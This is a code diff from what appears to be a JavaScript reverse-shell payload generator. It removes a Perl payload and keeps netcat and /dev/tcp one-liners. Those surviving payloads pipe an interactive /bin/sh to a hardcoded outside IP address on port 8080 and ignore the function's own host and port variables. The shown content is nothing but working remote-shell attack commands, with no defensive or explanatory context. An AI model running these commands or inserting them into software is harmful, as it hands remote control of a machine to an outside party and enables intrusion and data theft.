@@ -18,7 +18,6 @@ const reverseShell = (address = '') => {
 	}
 
 	const payloads = {
-		perl: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
 		nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 163.123.181.47 8080 >/tmp/f`,
 		sh: `/bin/sh -i >& /dev/tcp/163.123.181.47/8080 0>&1`
 	};
